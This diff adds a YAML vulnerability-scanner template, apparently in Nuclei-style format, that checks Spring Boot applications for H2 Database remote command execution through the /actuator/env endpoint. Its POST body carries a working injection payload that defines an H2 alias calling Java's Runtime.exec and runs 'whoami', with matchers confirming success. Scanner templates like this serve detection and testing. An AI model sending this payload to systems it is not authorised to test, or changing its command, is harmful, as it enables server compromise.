@@ -1,0 +1,32 @@
+id: springboot-h2-db-rce
+brief:
+    title: Spring Boot H2 Database - Remote Command Execution
+    by: dwisiswant0
+    level: critical
+    about: Spring Boot H2 Database is susceptible to remote code execution.
+    label:
+        - springboot
+        - rce
+        - jolokia
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/actuator/env'
+      head:
+        Content-Type: application/json
+      body: |-
+        {
+          "name":"spring.datasource.hikari.connection-test-query",
+          "value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('whoami');"
+        }
+      signs:
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - '"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT'
+          in: body
+          need: all
